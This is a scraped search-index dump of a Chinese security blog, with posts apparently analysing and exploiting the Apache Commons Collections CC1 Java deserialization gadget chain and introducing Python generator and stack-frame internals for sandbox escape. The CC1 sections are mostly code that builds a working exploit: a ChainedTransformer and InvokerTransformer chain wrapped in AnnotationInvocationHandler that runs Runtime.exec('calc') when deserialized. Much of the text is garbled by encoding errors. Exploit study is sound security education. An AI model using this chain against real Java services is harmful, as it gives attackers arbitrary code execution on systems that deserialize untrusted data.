con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); Object obj=con.newInstance(Override.class,t); serilize(obj); deserilize(\"ser.bin\"); } public static void serilize(Object obj)throws IOException{ ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } }","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:4","tags":["java","ååºåˆ—åŒ–"],"title":"CC1é“¾çš„åˆ†æä¸åˆ©ç”¨","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"ä¸‰ä¸ªé—®é¢˜ å½“ç„¶è¿™æ ·æ˜¯è¿˜è°ƒç”¨ä¸åˆ°setValueæ–¹æ³•çš„ï¼Œæœ‰ä¸¤ä¸ªifæ¡ä»¶ã€‚è€Œä¸”å°±ç®—è°ƒç”¨äº†å‘ç°setVlaueå‚æ•°æ˜¯å›ºå®šçš„ï¼Œæˆ‘ä»¬è¿˜æ ¹æœ¬æ²¡æœ‰æŠŠRuntime.getRuntime()è¿™ä¸ªå‚æ•°ä¼ è¿›å»ï¼Œè€Œä¸”Runtime.getRuntime()ä¹Ÿä¸èƒ½è¿›è¡Œåºåˆ—åŒ–ï¼Œå› ä¸ºRuntimeæ²¡æœ‰åºåˆ—åŒ–æ¥å£ã€‚ æ€»ç»“ä¸€ä¸‹è¿™é‡Œçš„å‡ ä¸ªé—®é¢˜ï¼š **ä¸€ã€**Runtimeçš„åºåˆ—åŒ– **äºŒã€**setValueå‚æ•°çš„æ”¹å˜ **ä¸‰ã€**ä¸¤ä¸ªifæ¡ä»¶çš„ç»•è¿‡ ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:5","tags":["java","ååºåˆ—åŒ–"],"title":"CC1é“¾çš„åˆ†æä¸åˆ©ç”¨","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"è§£å†³Runtimeçš„åºåˆ—åŒ– å› ä¸ºRuntimeæ˜¯æ²¡æœ‰ååºåˆ—åŒ–æ¥å£çš„çš„ï¼Œæ‰€ä»¥å…¶ä¸èƒ½è¿›è¡Œååºåˆ—åŒ–ï¼Œä½†æ˜¯å¯ä»¥æŠŠå…¶å˜å›åŸå‹ç±»classï¼Œè¿™ä¸ªæ˜¯å­˜åœ¨serilizeæ¥å£çš„ï¼š åœ¨åˆ©ç”¨åå°„æ¥è°ƒç”¨å…¶æ–¹æ³•ï¼Œä¸‹é¢æ˜¯å…¶åå°„è°ƒç”¨çš„demoï¼š public class CC1test { public static void main(String[] args)throws Exception { Class c1=Runtime.class; Runtime runtime = (Runtime) c1.getMethod(\"getRuntime\",null).invoke(null); c1.getMethod(\"exec\",String.class).invoke(runtime,\"calc\"); } }ä¸è¿‡è¿™ç§å†™æ³•ä¸‹é¢ç…§ç€æ”¹InvokerTransformer.tansformè°ƒç”¨æ—¶ä¸å¥½å¯¹ç…§ï¼Œæ‰€ä»¥æ¢ä¸€ç§è¯¦ç»†çš„å†™æ³•ã€‚ public class CC1test { public static void main(String[] args)throws Exception { Class c1=Runtime.class; Method getruntime = c1.getMethod(\"getRuntime\",null); Runtime runtime=(Runtime) getruntime.invoke(null,null); c1.getMethod(\"exec\",String.class).invoke(runtime,\"calc\"); } }ç„¶ååˆ©ç”¨InvokerTransformer.tansformæ¥è¿›è¡Œä»£æ›¿åå°„è¿›è¡Œè°ƒç”¨ï¼Œå› ä¸ºéœ€è¦InvokerTransformer.tansformæ¥è°ƒç”¨å±é™©å‡½æ•°å˜›ã€‚ import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.reflect.Method; public class CC1test { public static void main(String[] args)throws Exception { Method getruntime=(Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class); Runtime runtime=(Runtime) new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getruntime); new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(runtime); } }åˆ†ææ„é€ ï¼Œè¿™é‡Œå…¶å®å°±å¯ä»¥æŠŠnew InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class);çœ‹ä½œæ˜¯è°ƒç”¨Runtime.classçš„getMethodæ–¹æ³•ï¼Œå‚æ•°æ˜¯(\"getRuntime\",null)ã€‚ å‰©ä¸‹çš„å¦‚æ³•ç‚®åˆ¶ã€‚ ä½†æ˜¯è¿™æ ·è¦ä¸€ä¸ªä¸ªåµŒå¥—åˆ›å»ºå‚æ•°å¤ªéº»çƒ¦äº†(å½“ç„¶ä¹Ÿå¿…é¡»è¿™ä¹ˆæ”¹)ï¼Œè¿™é‡Œæˆ‘ä»¬æƒ³èµ·ä¸Šé¢ä¸€ä¸ªCommons Collectionsåº“ä¸­å­˜åœ¨çš„ChainedTransformerç±»ï¼Œå®ƒä¹Ÿå­˜åœ¨transformæ–¹æ³•å¯ä»¥å¸®æˆ‘ä»¬éå†InvokerTransformerï¼Œå¹¶ä¸”è°ƒç”¨transformæ–¹æ³•: å†é€šä¿—ä¸€ç‚¹è®²å°±æ˜¯ä¸Šé¢è¯´è¿‡çš„ä¼šæŠŠå‰ä¸€æ¬¡çš„è¾“å‡ºå½“ä½œä¸‹ä¸€æ¬¡çš„è¾“å…¥ï¼Œè¿™é‡Œtransformçš„å‚æ•°ä¹Ÿå°±æ˜¯ä¸Šä¸€æ¬¡çš„è¾“å‡ºï¼Œæ‰€ä»¥éå¸¸ç¬¦åˆå½“å‰è¿™ç§æƒ…å†µã€‚ æ„é€ ï¼š import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; public class CC1test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; new ChainedTransformer(transformers).transform(Runtime.class);ç®€å•åˆ†æä¸€ä¸‹å°±æ˜¯å»ºç«‹ä¸€ä¸ªæ•°ç»„æŠŠåˆšåˆštransformå‡½æ•°å‰é¢ä¸åŒçš„å€¼å‚¨å­˜èµ·æ¥å¾…ä¼šå¾ªç¯è°ƒç”¨ã€‚ç„¶ååªéœ€ä¼ å…¥å‚æ•°Runtime.classå°±è¡Œäº†ã€‚ é‚£ä¹ˆè§£å†³äº†Runtimeååºåˆ—åŒ–çš„é—®é¢˜ï¼Œç°åœ¨å…ˆåŠ ä¸Šååºåˆ—åŒ–çš„ä»£ç ï¼š package org.example; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ChainedTransformer cha=new ChainedTransformer(transformers); // cha.transform(Runtime.class); HashMap\u003cObject,Object\u003e map=new HashMap\u003c\u003e(); map.put(\"key\",\"aaa\"); Map\u003cObject,Object\u003e tmap=TransformedMap.decorate(map,null,cha);//é™æ€æ–¹æ³•è°ƒç”¨ Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); Object obj=con.newInstance(Override.class,tmap); serilize(obj); deserilize(\"ser.bin\"); } public static void serilize(Object obj)throws IO","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:6","tags":["java","ååºåˆ—åŒ–"],"title":"CC1é“¾çš„åˆ†æä¸åˆ©ç”¨","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"è§£å†³ifæ¡ä»¶ ä¸Šé¢ä»£ç è¿è¡Œè‚¯å®šæ˜¯å¼¹ä¸äº†è®¡ç®—æœºçš„ã€‚çœ‹çœ‹è°ƒç”¨setValueçš„åœ°æ–¹ï¼š å…ˆä¸è¯´setValue()æ–¹æ³•çš„å‚æ•°ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œè¿™é‡Œè¿˜æœ‰ä¸¤ä¸ªifæ¡ä»¶ï¼Œç¬¬ä¸€ä¸ªifæ˜¯è¦memberType != nullï¼Œå…ˆçœ‹memberTypeæ˜¯ä»€ä¹ˆï¼š Class\u003c?\u003e memberType = memberTypes.get(name);è€Œè¿™é‡Œçš„nameå°±æ˜¯é”®å€¼å¯¹ä¸­çš„å»ºï¼ŒmemberTypesï¼š Map\u003cString, Class\u003c?\u003e\u003e memberTypes = annotationType.memberTypes();è¿™ä¸ªå°±æ˜¯æ³¨è§£ä¸­æˆå‘˜å˜é‡çš„åç§°ï¼Œä½†æ˜¯ä¸Šé¢çš„Overrideæ²¡æœ‰æˆå‘˜å˜é‡ã€‚æ¢ä¸€ä¸ªæ³¨è§£ï¼Œè¿™é‡Œç”¨åˆ°Target å…¶æˆå‘˜å˜é‡åç§°æ˜¯valueï¼Œæ‰€ä»¥æŠŠkeyè®¾ä¸ºvalueã€‚å†æ¬¡è¿›è¡Œè°ƒè¯•ï¼š å‘ç°ç¬¬äºŒä¸ªifç›´æ¥å°±ç¬¦åˆæ¡ä»¶äº†ï¼Œé¡ºåˆ©æ¥åˆ°äº†setValue()ï¼Œä¸è¿‡è¿™é‡Œè¿˜æ˜¯ç®€å•åˆ†æä¸€ä¸‹ç¬¬äºŒä¸ªifæ¡ä»¶ï¼š å°±æ˜¯åˆ¤æ–­valueæ˜¯å¦æ˜¯memberTypeå’ŒExceptionProxyç±»å‹çš„å®ä¾‹ï¼Œè¿™é‡Œvalueä¼ çš„æ˜¯aaaå­—ç¬¦ä¸²è‚¯å®šå®ä¸ç¬¦å’Œã€‚æ‰€ä»¥ç›´æ¥è°ƒç”¨åˆ°äº†æœ€åä¸€æ­¥setValueæ–¹æ³•ã€‚ ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:7","tags":["java","ååºåˆ—åŒ–"],"title":"CC1é“¾çš„åˆ†æä¸åˆ©ç”¨","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"è§£å†³setValueå‚æ•° åˆ°è¿™é‡Œåœ¨ç†ä¸€éæ€è·¯ï¼Œå…ˆæŠŠä¸Šé¢çš„ä»£ç ç²˜ä¸‹æ¥ï¼š package org.example; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ChainedTransformer cha=new ChainedTransformer(transformers); // cha.transform(Runtime.class); HashMap\u003cObject,Object\u003e map=new HashMap\u003c\u003e(); map.put(\"key\",\"aaa\"); Map\u003cObject,Object\u003e tmap=TransformedMap.decorate(map,null,cha);//é™æ€æ–¹æ³•è°ƒç”¨ Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); Object obj=con.newInstance(Override.class,tmap); serilize(obj); deserilize(\"ser.bin\"); } public static void serilize(Object obj)throws IOException{ ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } }é¦–å…ˆæ˜¯é€šè¿‡InvokerTransformerç±»çš„transformæ–¹æ³•æ¥åå°„è°ƒç”¨Runtime.getRuntimeçš„execæ–¹æ³•æ‰§è¡Œå±é™©å‘½ä»¤ã€‚ åé¢ç”±äºéœ€è¦Runtimeåºåˆ—åŒ–ï¼Œæ‰€ä»¥è¦åˆ©ç”¨Runtime.classæ¥ä¸€æ­¥ä¸€æ­¥è°ƒç”¨åˆ°å±é™©å‡½æ•°ï¼ˆä¹Ÿå°±æ˜¯é€‰è°ƒç”¨åˆ°getRuntimeæ–¹æ³•ç„¶åå†è°ƒç”¨åˆ°execæ–¹æ³•ï¼‰æ‰€ä»¥è¿ç»­ç”¨äº†å‡ æ¬¡InvokerTransformerç±»çš„transformæ–¹æ³•ã€‚ä½†æ˜¯åé¢åºåˆ—åŒ–è‚¯å®šåªæœ‰Runtime.classä¸€ä¸ªå‚æ•°ä¼ è¿›å»ï¼Œæ‰€ä»¥åˆåˆ©ç”¨äº†ChainedTransformerç±»ã€‚å®ƒçš„transformæ–¹æ³•å¯ä»¥å®ç°è¿­ä»£è°ƒç”¨transformæ–¹æ³•ï¼Œè¿™æ ·å°±åªç”¨ä¼ å…¥Runtime.classå°±å¯ä»¥ç›´æ¥æ‰§è¡Œåˆ°æœ€åçš„calcäº†ï¼ˆå½“ç„¶è¿™æ˜¯æ‰‹åŠ¨è°ƒç”¨ï¼‰ã€‚ ç„¶åå°±æ˜¯åˆ©ç”¨TransformedMapç±»checkSetValueæ–¹æ³•æ¥è°ƒç”¨ChainedTransformerç±»çš„transformï¼Œåœ¨è¿™ä¹‹å‰ï¼Œåˆ©ç”¨TransformedMap.decorateé™æ€æ–¹æ³•æ¥å®ç°TransformedMapç±»çš„å®ä¾‹åŒ–ä¸»è¦éœ€è¦è°ƒç”¨å…¶æ„é€ æ–¹æ³•è®©å‚æ•°valueTransformerçš„å€¼ç­‰äºChainedTransformerï¼Œè¿™æ ·checkSetValueæ‰èƒ½ç®—æ˜¯è°ƒç”¨ChainedTransformerçš„transformæ–¹æ³•ï¼Œ ä½†ç”±äºè¿™é‡ŒcheckSetValueæ˜¯ä¿æŠ¤å±æ€§ï¼Œæ‰€ä»¥åˆè¦åˆ©ç”¨MapEntryç±»çš„setValueæ–¹æ³•æ¥è°ƒç”¨checkSetValueæ–¹æ³•ï¼Œç”±äºMapEntryæ˜¯ä¸ªå­ç±»ä¸”å…¶ç»§æ‰¿äº†Map.Entryæ¥å£å¯ä»¥åœ¨ä½¿ç”¨ä¸Šé¢Mapéå†çš„å½¢å¼è°ƒç”¨åˆ°MapEntryç±»çš„setValueæ–¹æ³•ï¼ˆè¿™æ˜¯æ‰‹åŠ¨ï¼‰ æœ€åå‘ç°AnnotationInvocationHandlerç±»ä¸­çš„readObjectæ–¹æ³•ä¸­åˆšå¥½æœ‰è¿™ä¸ªMapéå†ï¼Œè‡³æ­¤åˆ°readObjectå°±ç®—å®Œæˆäº†æœ€åä¸€ä¸ªç±»ï¼Œè™½ç„¶å…¶æ˜¯defualtå±æ€§ï¼Œä½†è¿˜æ˜¯å¯ä»¥åˆ©ç”¨åå°„æ¥è¾¾åˆ°è°ƒç”¨ã€‚åˆ°è¿™é‡Œåªéœ€è¦è§£å†³æœ€åä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯setValueçš„å‚æ•°é—®é¢˜ï¼Œå› ä¸ºè¿™ä¸ªsetValueçš„å‚æ•°ä¹Ÿå°±æ˜¯æœ€åtransformçš„å‚æ•°ã€‚ å‘ç°å‰é¢æåˆ°çš„ç±»ConstantTransformerå¯ä»¥æŠŠæ¥å—çš„ä»»ä½•å‚æ•°éƒ½è¿”å›ä¸€ä¸ªå¸¸é‡å¹¶ä¸”å¸¸é‡å¯æ§ã€‚ é‚£ä¹ˆæ„é€ ï¼š package org.example; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ChainedTransformer cha=new ChainedTransformer(transformers); // cha.transform(Runtime.class); HashMap\u003cObject,Object\u003e map=new HashMap\u003c\u003e(); map.put(\"value\",\"aaa\"); Map\u003cObject,Object\u003e tmap=TransformedMap.decorate(map,null,","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:8","tags":["java","ååºåˆ—åŒ–"],"title":"CC1é“¾çš„åˆ†æä¸åˆ©ç”¨","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"æ€»ç»“ ä¸»è¦çš„å‡½æ•°è°ƒç”¨å°±æ˜¯ï¼š transform â€”-\u003echeckSetValue â€”-\u003e setValue â€”-\u003e readObject åªæ˜¯å…¶ä¸­ç©¿æ’äº†ä¸€äº›å…¶ä»–éœ€è¦è§£å†³çš„é—®é¢˜ã€‚ ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:4:0","tags":["java","ååºåˆ—åŒ–"],"title":"CC1é“¾çš„åˆ†æä¸åˆ©ç”¨","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"ä¸€ã€ç”Ÿæˆå™¨ ç”Ÿæˆå™¨ï¼ˆGeneratorï¼‰æ˜¯ Python ä¸­ä¸€ç§ç‰¹æ®Šçš„è¿­ä»£å™¨ï¼Œå®ƒå¯ä»¥é€šè¿‡ç®€å•çš„å‡½æ•°å’Œè¡¨è¾¾å¼æ¥åˆ›å»ºã€‚ç”Ÿæˆå™¨çš„ä¸»è¦ç‰¹ç‚¹æ˜¯èƒ½å¤Ÿé€ä¸ªäº§ç”Ÿå€¼ï¼Œå¹¶ä¸”åœ¨æ¯æ¬¡ç”Ÿæˆå€¼åä¿ç•™å½“å‰çš„çŠ¶æ€ï¼Œä»¥ä¾¿ä¸‹æ¬¡è°ƒç”¨æ—¶å¯ä»¥ç»§ç»­ç”Ÿæˆå€¼ã€‚è¿™ä½¿å¾—ç”Ÿæˆå™¨éå¸¸é€‚åˆå¤„ç†å¤§å‹æ•°æ®é›†æˆ–éœ€è¦å»¶è¿Ÿè®¡ç®—çš„æƒ…å†µã€‚ åœ¨ Python ä¸­ï¼Œç”Ÿæˆå™¨å¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼åˆ›å»ºï¼š 1ã€ç”Ÿæˆå™¨å‡½æ•°ï¼šå®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œä½¿ç”¨ yield å…³é”®å­—ç”Ÿæˆå€¼ï¼Œæ¯æ¬¡è°ƒç”¨ç”Ÿæˆå™¨å‡½æ•°æ—¶ï¼Œç”Ÿæˆå™¨ä¼šæš‚åœå¹¶è¿”å›ä¸€ä¸ªå€¼ï¼Œä¸‹æ¬¡è°ƒç”¨æ—¶ä¼šä»æš‚åœçš„åœ°æ–¹ç»§ç»­æ‰§è¡Œã€‚ï¼ˆç¬¦åˆä¸Šé¢çš„æ¯æ¬¡ç”Ÿæˆå€¼åä¿ç•™å½“å‰çš„çŠ¶æ€ï¼Œä»¥ä¾¿ä¸‹æ¬¡è°ƒç”¨æ—¶å¯ä»¥ç»§ç»­ç”Ÿæˆå€¼ï¼‰ã€‚ ç¤ºä¾‹ï¼š def my_generator(): yield 1 yield 2 yield 3 gen = my_generator() print(next(gen)) # ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œè¾“å‡º 1 print(next(gen)) # ç¬¬äºŒæ¬¡è°ƒç”¨ï¼Œè¾“å‡º 2 print(next(gen)) # ç¬¬ä¸‰æ¬¡è°ƒç”¨ï¼Œè¾“å‡º 32ã€ç”Ÿæˆå™¨è¡¨è¾¾å¼ï¼šä½¿ç”¨ç±»ä¼¼åˆ—è¡¨æ¨å¯¼å¼çš„è¯­æ³•ï¼Œä½†ä½¿ç”¨åœ†æ‹¬å·è€Œä¸æ˜¯æ–¹æ‹¬å·ï¼Œå¯ä»¥ç”¨æ¥åˆ›å»ºç”Ÿæˆå™¨å¯¹è±¡ã€‚ç”Ÿæˆå™¨è¡¨è¾¾å¼ä¼šé€ä¸ªç”Ÿæˆå€¼ï¼Œè€Œä¸æ˜¯ä¸€æ¬¡æ€§ç”Ÿæˆæ•´ä¸ªåºåˆ—ï¼Œè¿™æ ·å¯ä»¥èŠ‚çœå†…å­˜ç©ºé—´ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†å¤§å‹æ•°æ®é›†æ—¶éå¸¸æœ‰ç”¨ï¼ˆä¾ç„¶ç¬¦åˆæ¯æ¬¡ç”Ÿæˆå€¼åä¿ç•™å½“å‰çš„çŠ¶æ€ï¼Œä»¥ä¾¿ä¸‹æ¬¡è°ƒç”¨æ—¶å¯ä»¥ç»§ç»­ç”Ÿæˆå€¼ï¼‰ã€‚ ç¤ºä¾‹ï¼š gen = (x * x for x in range(5)) print(list(gen)) # è¾“å‡º [0, 1, 4, 9, 16]","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:1","tags":["python","æ²™ç®±é€ƒé€¸"],"title":"pythonæ ˆå¸§æ²™ç®±é€ƒé€¸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"äºŒã€æ ˆå¸§(frame) åœ¨ Python ä¸­ï¼Œæ ˆå¸§ï¼ˆstack frameï¼‰ï¼Œä¹Ÿç§°ä¸ºå¸§ï¼ˆframeï¼‰ï¼Œæ˜¯ç”¨äºæ‰§è¡Œä»£ç çš„æ•°æ®ç»“æ„ã€‚æ¯å½“ Python è§£é‡Šå™¨æ‰§è¡Œä¸€ä¸ªå‡½æ•°æˆ–æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ ˆå¸§ï¼Œç”¨äºå­˜å‚¨è¯¥å‡½æ•°æˆ–æ–¹æ³•çš„å±€éƒ¨å˜é‡ã€å‚æ•°ã€è¿”å›åœ°å€ä»¥åŠå…¶ä»–æ‰§è¡Œç›¸å…³çš„ä¿¡æ¯ã€‚è¿™äº›æ ˆå¸§ä¼šæŒ‰ç…§è°ƒç”¨é¡ºåºè¢«ç»„ç»‡æˆä¸€ä¸ªæ ˆï¼Œç§°ä¸ºè°ƒç”¨æ ˆã€‚ æ ˆå¸§åŒ…å«äº†ä»¥ä¸‹å‡ ä¸ªé‡è¦çš„å±æ€§ï¼š f_locals: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å±€éƒ¨å˜é‡ã€‚é”®æ˜¯å˜é‡åï¼Œå€¼æ˜¯å˜é‡çš„å€¼ã€‚ f_globals: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•æ‰€åœ¨æ¨¡å—çš„å…¨å±€å˜é‡ã€‚é”®æ˜¯å…¨å±€å˜é‡åï¼Œå€¼æ˜¯å˜é‡çš„å€¼ã€‚ f_code: ä¸€ä¸ªä»£ç å¯¹è±¡ï¼ˆcode objectï¼‰ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å­—èŠ‚ç æŒ‡ä»¤ã€å¸¸é‡ã€å˜é‡åç­‰ä¿¡æ¯ã€‚ f_lasti: æ•´æ•°ï¼Œè¡¨ç¤ºæœ€åæ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤çš„ç´¢å¼•ã€‚ f_back: æŒ‡å‘ä¸Šä¸€çº§è°ƒç”¨æ ˆå¸§çš„å¼•ç”¨ï¼Œç”¨äºæ„å»ºè°ƒç”¨æ ˆã€‚ ","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:2","tags":["python","æ²™ç®±é€ƒé€¸"],"title":"pythonæ ˆå¸§æ²™ç®±é€ƒé€¸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"ä¸‰ã€ç”Ÿæˆå™¨çš„å±æ€§ gi_code: ç”Ÿæˆå™¨å¯¹åº”çš„codeå¯¹è±¡ã€‚ gi_frame: ç”Ÿæˆå™¨å¯¹åº”çš„frameï¼ˆæ ˆå¸§ï¼‰å¯¹è±¡ã€‚ gi_running: ç”Ÿæˆå™¨å‡½æ•°æ˜¯å¦åœ¨æ‰§è¡Œã€‚ç”Ÿæˆå™¨å‡½æ•°åœ¨yieldä»¥åã€æ‰§è¡Œyieldçš„ä¸‹ä¸€è¡Œä»£ç å‰å¤„äºfrozençŠ¶æ€ï¼Œæ­¤æ—¶è¿™ä¸ªå±æ€§çš„å€¼ä¸º0ã€‚ gi_yieldfromï¼šå¦‚æœç”Ÿæˆå™¨æ­£åœ¨ä»å¦ä¸€ä¸ªç”Ÿæˆå™¨ä¸­ yield å€¼ï¼Œåˆ™ä¸ºè¯¥ç”Ÿæˆå™¨å¯¹è±¡çš„å¼•ç”¨ï¼›å¦åˆ™ä¸º Noneã€‚ gi_frame.f_localsï¼šä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«ç”Ÿæˆå™¨å½“å‰å¸§çš„æœ¬åœ°å˜é‡ã€‚ ç€é‡ä»‹ç»ä¸€ä¸‹ gi_frame å±æ€§ gi_frame æ˜¯ä¸€ä¸ªä¸ç”Ÿæˆå™¨ï¼ˆgeneratorï¼‰å’Œåç¨‹ï¼ˆcoroutineï¼‰ç›¸å…³çš„å±æ€§ã€‚å®ƒæŒ‡å‘ç”Ÿæˆå™¨æˆ–åç¨‹å½“å‰æ‰§è¡Œçš„å¸§å¯¹è±¡ï¼ˆframe objectï¼‰ï¼Œå¦‚æœè¿™ä¸ªç”Ÿæˆå™¨æˆ–åç¨‹æ­£åœ¨æ‰§è¡Œçš„è¯ã€‚å¸§å¯¹è±¡è¡¨ç¤ºä»£ç æ‰§è¡Œçš„å½“å‰ä¸Šä¸‹æ–‡ï¼ŒåŒ…å«äº†å±€éƒ¨å˜é‡ã€æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤ç­‰ä¿¡æ¯ã€‚ ä¾‹å­ï¼š def my_generator(): yield 1 yield 2 yield 3 gen = my_generator() # è·å–ç”Ÿæˆå™¨çš„å½“å‰å¸§ä¿¡æ¯ frame = gen.gi_frame # è¾“å‡ºç”Ÿæˆå™¨çš„å½“å‰å¸§ä¿¡æ¯ print(\"Local Variables:\", frame.f_locals) print(\"Global Variables:\", frame.f_globals) print(\"Code Object:\", frame.f_code) print(\"Instruction Pointer:\", frame.f_lasti)åŒç†åˆ©ç”¨gi_codeå±æ€§ä¹Ÿå¯ä»¥è·å¾—ç”Ÿæˆå™¨çš„ç›¸å…³ä»£ç å¯¹è±¡å±æ€§ï¼š def my_generator(): yield 1 yield 2 yield 3 gen = my_generator() # è·å–ç”Ÿæˆå™¨çš„å½“å‰ä»£ç ä¿¡æ¯ code = gen.gi_code # è¾“å‡ºç”Ÿæˆå™¨çš„å½“å‰ä»£ç ä¿¡æ¯ print( code.co_name) 